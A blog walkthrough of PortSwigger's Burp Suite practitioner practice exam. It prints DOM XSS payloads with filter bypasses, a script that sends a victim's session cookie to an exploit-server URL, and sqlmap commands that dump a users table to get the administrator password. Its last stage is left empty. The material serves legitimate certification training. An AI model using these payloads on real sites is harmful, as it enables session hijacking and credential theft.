---
title: BurpSuite Certified Practitioner Practice Exam
author: H0j3n
date: 2021-11-11 00:00:00
categories: [Webs]
tags: [Webs]
render_with_liquid: false
---

### Introduction

PortSwigger has introduced the **Burp Suite Certified Practitioner** accreditation this year. It is a **three-hour** exam and by passing one you'll be able to demonstrate the ability to:

- Detect and exploit common web vulnerabilities.
- Display knowledge of fundamental web technologies
- Adapt attacks to evade common defenses.

The Burp Suite Certified Practitioner exam costs **$99** and you will need to have an **active subscription** to Burp Suite Professional. You can get certified by using only this 3 steps.

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/burp_step_certs.PNG)

Also, if you pass the exam before 15 Dec they will **refund** your $99!

### Burp Suite Certified Practitioner Practice Exam

I will not go further into the explanation of the practice exam as you can read more in [here](https://portswigger.net/web-security/certification/practice-exam) . But there are three (3) stages that we need to complete:

- **Stage 1**: Access any user account.
- **Stage 2**: Use your user account to access the admin interface at **/admin**, perhaps by elevating your privileges or compromising the administrator account.
- **Stage 3**: Use the admin interface to read the contents of **/home/carlos/secret** from the server's filesystem, and submit it using **"submit solution"**.

Before we go through the practice exam, there are few things to take notes.

~~~
-> All the parameters found in this walkthrough might change and will not be the same as yours.
~~~

#### Walkthrough 1/3

When we open the challenge, we can see there is a search function. You can try with a simple payload to check different vulnerabilities such as `single quote (')`, XSS payload or etc. When we try put for example `test123` and view the Burp HTTP history, we can see also `searchResults.js` been requested.

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/burp_found_js.png)

From here, we can see inside the javascript there is `eval` function been used.

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/burp_found_eval.png)

Thanks to [@r00tpgp](https://www.r00tpgp.com/2021/08/burp-suite-certified-practitioner-exam.html) blog, I learn something new. We can use this Chrome extension to easily discover and test inputs passed into sinks that could lead to **DOM XSS vulnerabilities**.

- [Untrusted Types For DevTools](https://chrome.google.com/webstore/detail/untrusted-types-for-devto/bpeblffgmddnafmnmdjohcmkbeifdlnb?hl=en)

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/chrome_extension_untrusted.PNG)

When we search something again, we could see this in our **console**.

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/console_js.png)

Here are payloads that will works:

~~~
"-alert(1)-"
\\"-alert(1)}//
"-alert(1)}//
~~~

Now, let's create a payload to alert cookies. 

~~~
"-alert(document.cookie)-"
~~~

We notice that it will get blocked.

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/payload_blocked.png)

Using global variables, we can bypass it.

~~~
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
~~~

Let's create another payload to test before send to our exploit server. But, this will also get blocked.

~~~
"-(window["document"]["location"]="https://<CHANGE_HERE>.web-security-academy.net/?"+window["document"]["cookie"])-"
~~~

By replacing `.` with `%2e` we are able to bypass it.

~~~
"-(window["document"]["location"]="https://<CHANGE_HERE>%2eweb-security-academy%2enet/?"+window["document"]["cookie"])-"
~~~

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/cyberchef_urlencode_1.png)

We can see our **session key** in log.

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/session_log.png)

When we try to use the first payload **(Before URL Encode)**, it doesn't work. After we use the second payload **(After URL Encode)**, it seems to work now. You can use [CyberChef](https://gchq.github.io/CyberChef/) as it easy to use.

~~~
# Before URL Encode
<script>
location='https://<CHANGE_HERE>.web-security-academy.net/?find="-(window["document"]["location"]="https://<CHANGE_HERE>>%2eweb-security-academy%2enet/?"+window["document"]["cookie"])-"';
</script>

# After URL Encode
<script>
location='https://<CHANGE_HERE>.web-security-academy.net/?find=%22%2D%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2F<CHANGE_HERE>%252eweb%2Dsecurity%2Dacademy%252enet%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29%2D%22';
</script>
~~~

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/cyberchef_urlencode_2.png)

Nice! We got the session cookie **(Carlos)** in our log.

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/session_log_2.png)

Change the session cookie and we will get login as **Carlos**!

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/carlos_login.png)


#### Walkthrough 2/3

There is new features `Advanced Search` that we could access using **Carlos** account.

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/advanced_search.png)

By inserting `single quote (')` on the second parameter it will give us SQL Error **(PostgreSQL)**.

~~~
https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by='&writer=
~~~

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/sql_error.png)

Since we know the parameter that vulnerable to **SQLi**, we can now use **SQLMap**.

~~~
(1)
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --batch

(2) - Get Databases
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --dbs --batch

(3) - Get Tables
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" -D public --tables --batch

(4) - Dump Specific Table
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" -D public -T users --dump --batch
~~~

We will then be able to dump the `users` tables and get the `administrator` password!

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/sqlmap_output.png)

Login as `administrator` and delete **Carlos** account to complete the second (2) stage.

![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/deleted_carlos.png)

If you want to use **SQLMap** in Windows, make sure you have **Python2/Python3** and download the `zip` file from [here](https://sqlmap.org/)

#### Walkthrough 3/3

### Conclusion

### References

- https://www.r00tpgp.com/2021/08/burp-suite-certified-practitioner-exam.html
- https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/
- https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/

